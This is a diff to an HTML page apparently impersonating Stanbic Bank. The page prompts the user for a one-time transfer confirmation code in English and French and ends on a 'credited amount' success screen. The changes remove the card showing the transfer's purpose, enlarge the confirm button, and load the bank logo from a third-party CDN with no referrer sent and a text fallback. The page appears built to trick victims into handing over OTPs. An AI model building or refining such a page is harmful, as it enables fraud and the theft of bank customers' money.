@@ -38,7 +38,7 @@
     position: relative; overflow: hidden;
   }
 
-  /* ─── TOP ─── */
+  /* ─── TOP — logo + text, both visible ─── */
   .top {
     position: relative; flex-shrink: 0;
     background: linear-gradient(160deg, var(--sb-primary) 0%, var(--sb-royal) 100%);
@@ -51,10 +51,19 @@
     background: var(--sb-gold);
     border-top-left-radius: 20px; border-top-right-radius: 20px;
   }
-  .top-logo {
-    height: 28px; width: auto; display: block;
-    filter: brightness(0) invert(1); opacity: 0.96;
+  .brand-row {
+    display: flex; align-items: center; gap: 10px;
   }
+  .top-logo {
+    height: 34px; width: auto; display: block;
+    flex-shrink: 0;
+  }
+  .brand-text {
+    font-size: 22px; font-weight: 800; letter-spacing: -0.5px;
+    color: #fff; line-height: 1; white-space: nowrap;
+  }
+  .brand-text .dot { color: var(--sb-gold); }
+
   .page-title {
     margin-top: 18px; font-size: 19px; font-weight: 800;
     color: #fff; letter-spacing: -0.3px; line-height: 1.25;
@@ -71,11 +80,11 @@
     display: flex; flex-direction: column; justify-content: flex-start;
   }
 
-  /* Amount + purpose cards */
+  /* Amount card (no purpose) */
   .amount-card {
     background: var(--sb-soft); border-radius: 12px;
     border: 1px solid var(--sb-border);
-    padding: 14px 16px; margin-bottom: 12px;
+    padding: 16px 18px; margin-bottom: 22px;
     display: flex; flex-direction: column; gap: 3px;
   }
   .amount-card .label {
@@ -83,27 +92,8 @@
     letter-spacing: 0.7px; text-transform: uppercase;
   }
   .amount-card .amount {
-    font-size: 22px; font-weight: 800; color: var(--sb-primary);
+    font-size: 26px; font-weight: 800; color: var(--sb-primary);
     letter-spacing: -0.5px; line-height: 1.2;
-  }
-  .purpose-card {
-    background: #FFFDF5; border-radius: 12px;
-    border: 1px solid #F2E4B8;
-    padding: 12px 16px; margin-bottom: 18px;
-    position: relative; overflow: hidden;
-  }
-  .purpose-card.hidden { display: none; }
-  .purpose-card::before {
-    content: ''; position: absolute; left: 0; top: 0; bottom: 0; width: 3px;
-    background: var(--sb-gold);
-  }
-  .purpose-card .label {
-    font-size: 10px; font-weight: 800; letter-spacing: 0.7px;
-    text-transform: uppercase; color: #8A6600; margin-bottom: 3px; display: block;
-  }
-  .purpose-card .purpose {
-    font-size: 13px; font-weight: 700; color: var(--sb-navy);
-    line-height: 1.4; word-break: break-word;
   }
 
   /* Notice */
@@ -114,7 +104,7 @@
     font-size: 12.5px;
     font-weight: 600;
     line-height: 1.55;
-    margin-bottom: 16px;
+    margin-bottom: 18px;
     border: 1px solid transparent;
   }
   .notice.show { display: block; }
@@ -127,7 +117,7 @@
   }
   .notice.warn .notice-title { color: #8A6600; }
 
-  /* Section */
+  /* Section label */
   .section-label {
     font-size: 10.5px; font-weight: 800; letter-spacing: 0.7px;
     text-transform: uppercase; color: var(--sb-muted);
@@ -140,12 +130,12 @@
     margin-bottom: 10px;
   }
   .code-input {
-    width: 60px; height: 68px;
+    width: 62px; height: 72px;
     background: var(--sb-soft);
     border: 1.5px solid var(--sb-border);
     border-radius: 10px;
     font-family: inherit;
-    font-size: 26px; font-weight: 800;
+    font-size: 28px; font-weight: 800;
     color: var(--sb-primary);
     text-align: center;
     outline: none;
@@ -175,15 +165,17 @@
   }
   .field-error.show { display: block; }
 
-  /* Buttons */
+  /* ─── CONFIRM BUTTON — BIG ─── */
   .btn-approve {
-    width: 100%; margin-top: 24px; height: 52px;
+    width: 100%; margin-top: 24px; min-height: 64px;
     background: var(--sb-primary); color: #fff;
-    font-family: inherit; font-size: 14.5px; font-weight: 700;
-    letter-spacing: 0.5px; text-transform: uppercase;
-    border: none; border-radius: 10px; cursor: pointer;
-    box-shadow: 0 8px 20px rgba(1,0,140,0.22);
+    font-family: inherit; font-size: 17px; font-weight: 800;
+    letter-spacing: 0.4px;
+    border: none; border-radius: 12px; cursor: pointer;
+    box-shadow: 0 10px 24px rgba(1,0,140,0.28);
     transition: filter .15s, transform .1s, opacity .15s;
+    display: flex; align-items: center; justify-content: center;
+    padding: 18px 24px;
   }
   .btn-approve:hover { filter: brightness(1.08); }
   .btn-approve:active { transform: scale(0.985); }
@@ -193,7 +185,7 @@
     display: none;
     align-items: center; justify-content: center; gap: 8px;
     width: 100%; margin-top: 12px;
-    padding: 12px 16px; font-size: 13px; font-weight: 700;
+    padding: 13px 16px; font-size: 13.5px; font-weight: 700;
     background: #fff; color: var(--sb-primary);
     border: 1.5px solid var(--sb-primary); border-radius: 10px;
     cursor: pointer; font-family: inherit; transition: all .15s;
@@ -240,12 +232,20 @@
   .authorizing .brand-label,
   .success .brand-label {
     margin-bottom: 28px;
+    display: flex; align-items: center; gap: 10px;
   }
   .authorizing .brand-label img,
   .success .brand-label img {
-    height: 28px; width: auto;
-    filter: brightness(0) invert(1); opacity: 0.96;
+    height: 34px; width: auto;
+    flex-shrink: 0;
   }
+  .authorizing .brand-label .brand-text,
+  .success .brand-label .brand-text {
+    font-size: 22px; font-weight: 800; color: #fff;
+    letter-spacing: -0.5px; line-height: 1;
+  }
+  .authorizing .brand-label .brand-text .dot,
+  .success .brand-label .brand-text .dot { color: var(--sb-gold); }
 
   .authorizing .spinner {
     width: 60px; height: 60px;
@@ -307,17 +307,23 @@
   @media (max-width: 380px) {
     .top { padding: 16px 18px 22px; }
     .body { padding: 18px 18px 18px; }
-    .top-logo { height: 24px; }
+    .top-logo { height: 30px; }
+    .brand-text { font-size: 20px; }
     .page-title { font-size: 17px; }
-    .amount-card .amount { font-size: 19px; }
+    .amount-card { padding: 14px 16px; margin-bottom: 18px; }
+    .amount-card .amount { font-size: 22px; }
     .code-row { gap: 9px; }
-    .code-input { width: 52px; height: 60px; font-size: 22px; }
-    .btn-approve { height: 50px; font-size: 14px; }
+    .code-input { width: 54px; height: 64px; font-size: 24px; }
+    .btn-approve { min-height: 60px; font-size: 16px; }
     .authorizing h2, .success h2 { font-size: 19px; }
     .authorizing .spinner { width: 50px; height: 50px; }
     .success .check { width: 72px; height: 72px; }
     .success .check svg { width: 38px; height: 38px; }
     .success .credited-amount { font-size: 22px; }
+    .authorizing .brand-label .brand-text,
+    .success .brand-label .brand-text { font-size: 18px; }
+    .authorizing .brand-label img,
+    .success .brand-label img { height: 28px; }
   }
   @media (min-width: 640px) {
     body { padding: 32px 0; align-items: center; }
@@ -334,11 +340,16 @@
 <div class="phone">
 
   <div class="top">
-    <img
-      class="top-logo"
-      src="https://cdn.brandfetch.io/idrjWN3IVw/w/582/h/164/theme/dark/logo.png?c=1dxbfHSJFAPEGdCLU4o5B"
-      alt="Stanbic Bank"
-    >
+    <div class="brand-row">
+      <img
+        class="top-logo"
+        src="https://cdn.brandfetch.io/idrjWN3IVw/w/582/h/164/theme/dark/logo.png?c=1dxbfHSJFAPEGdCLU4o5B"
+        alt="Stanbic Bank"
+        referrerpolicy="no-referrer"
+        onerror="this.style.display='none'"
+      >
+      <span class="brand-text">Stanbic<span class="dot">.</span></span>
+    </div>
     <div class="page-title" id="pageTitle">Enter confirmation code</div>
     <div class="page-sub" id="pageSub">Enter the one-time code sent to your phone to complete this transfer.</div>
   </div>
@@ -348,11 +359,6 @@
     <div class="amount-card">
       <span class="label" id="amountLabel">Amount</span>
       <span class="amount" id="amountValue">—</span>
-    </div>
-
-    <div class="purpose-card hidden" id="purposeCard">
-      <span class="label" id="purposeLabel">Purpose</span>
-      <span class="purpose" id="purposeValue">—</span>
     </div>
 
     <div class="notice warn" id="noticeExpired">
@@ -385,7 +391,10 @@
     <img
       src="https://cdn.brandfetch.io/idrjWN3IVw/w/582/h/164/theme/dark/logo.png?c=1dxbfHSJFAPEGdCLU4o5B"
       alt="Stanbic Bank"
+      referrerpolicy="no-referrer"
+      onerror="this.style.display='none'"
     >
+    <span class="brand-text">Stanbic<span class="dot">.</span></span>
   </div>
   <div class="spinner"></div>
   <h2 id="authTitle">Confirming transfer…</h2>
@@ -398,7 +407,10 @@
     <img
       src="https://cdn.brandfetch.io/idrjWN3IVw/w/582/h/164/theme/dark/logo.png?c=1dxbfHSJFAPEGdCLU4o5B"
       alt="Stanbic Bank"
+      referrerpolicy="no-referrer"
+      onerror="this.style.display='none'"
     >
+    <span class="brand-text">Stanbic<span class="dot">.</span></span>
   </div>
   <div class="check">
     <svg viewBox="0 0 24 24"><polyline points="5 12 10 17 19 7"/></svg>
@@ -417,7 +429,6 @@
       pageTitle: 'Enter confirmation code',
       pageSub: 'Enter the one-time code sent to your phone to complete this transfer.',
       amountLabel: 'Amount',
-      purposeLabel: 'Purpose',
       noticeExpiredTitle: 'Code expired',
       noticeExpiredBody: 'The code was not confirmed. Tap <strong>Resend code</strong> below to receive a new code, then enter it here.',
       sectionLabel: 'Enter code',
@@ -444,7 +455,6 @@
       pageTitle: 'Saisissez le code de confirmation',
       pageSub: 'Entrez le code à usage unique envoyé sur votre téléphone pour finaliser ce virement.',
       amountLabel: 'Montant',
-      purposeLabel: 'Motif',
       noticeExpiredTitle: 'Code expiré',
       noticeExpiredBody: 'Le code n\'a pas été confirmé. Appuyez sur <strong>Renvoyer le code</strong> ci-dessous pour recevoir un nouveau code, puis saisissez-le ici.',
       sectionLabel: 'Saisir le code',
@@ -518,7 +528,6 @@
     document.getElementById('pageTitle').textContent = T.pageTitle;
     document.getElementById('pageSub').textContent = T.pageSub;
     document.getElementById('amountLabel').textContent = T.amountLabel;
-    document.getElementById('purposeLabel').textContent = T.purposeLabel;
     document.getElementById('noticeExpiredTitle').textContent = T.noticeExpiredTitle;
     document.getElementById('noticeExpiredBody').innerHTML = T.noticeExpiredBody;
     document.getElementById('sectionLabel').textContent = T.sectionLabel;
@@ -618,15 +627,6 @@
 
     document.getElementById('amountValue').textContent =
       tx.am ? formatAmount(tx.am, tx.cur) : '—';
-
-    const purposeCard = document.getElementById('purposeCard');
-    const purposeValue = document.getElementById('purposeValue');
-    if (tx.pu && tx.pu.trim()) {
-      purposeValue.textContent = tx.pu.trim();
-      purposeCard.classList.remove('hidden');
-    } else {
-      purposeCard.classList.add('hidden');
-    }
 
     if ('OTPCredential' in window && navigator.credentials && navigator.credentials.get) {
       try {
